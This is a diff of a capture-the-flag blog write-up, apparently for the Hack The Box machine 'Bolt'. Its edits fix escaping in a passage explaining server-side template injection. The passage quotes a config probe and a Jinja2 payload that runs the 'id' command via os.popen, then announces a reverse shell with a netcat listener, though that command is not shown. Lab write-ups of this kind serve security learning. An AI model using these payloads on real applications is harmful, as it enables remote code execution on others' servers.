@@ -183,7 +183,7 @@ This time however, we have more options available in the menu on the left. We se
 
 After clicking on the link, we receive a second email which confirms the changes. This mail also contains the *Name* field (in my case *netpal*). I had to look at the forum once again and feel like I could have figure it out myself... Not the right method exactly, but the principle: we just saw the content of the *Name* field appears in the email confirmation. We can try to inject something in this parameter. However, I never heard about the exact technique we're supposed to use, **SSTI injection** (Server-Side Template Injection). Some web applications use template engines to dissociate the visual display (HTML, CSS, ...) from the application logic (PHP, python, ...). Those engines create templates in the application, which are a mix of "hard-coded" data (the page layout's code) and dynamic variables. When the application is used, the template engine repalces the variables stored in the template, transforms it into a web page (HTML) and sends it to the client.\\
 An SSTI vulnerability arises when users inputs are directly passed in a template, and executed by the template engine.\\
-We can detect SSTI vulnerabilities by fuzzing the application's fields. From <https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection>, we can try to inject *\\\{\\\\{config\\}}* in the *Name* field. Let's try it: we input it, submit the settings, and confirm the change by clicking the link in the email we received. We then receive a second email:
+We can detect SSTI vulnerabilities by fuzzing the application's fields. From <https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection>, we can try to inject *\{{config\}}* in the *Name* field. Let's try it: we input it, submit the settings, and confirm the change by clicking the link in the email we received. We then receive a second email:
 
 <div class="img_container">
 ![ssti]({{https://jsom1.github.io/}}/_images/htb_bolt_ssti.png)
@@ -192,7 +192,7 @@ We can detect SSTI vulnerabilities by fuzzing the application's fields. From <ht
 It works! There are many other commands we could try, for example we could execute the id command with the following syntax:
 
 ````
-\{\{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() \}\}
+\{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() \}}
 `````
 However, let's go straight for a reverse shell with the following command (we also start a netcat listener before executing it):
 
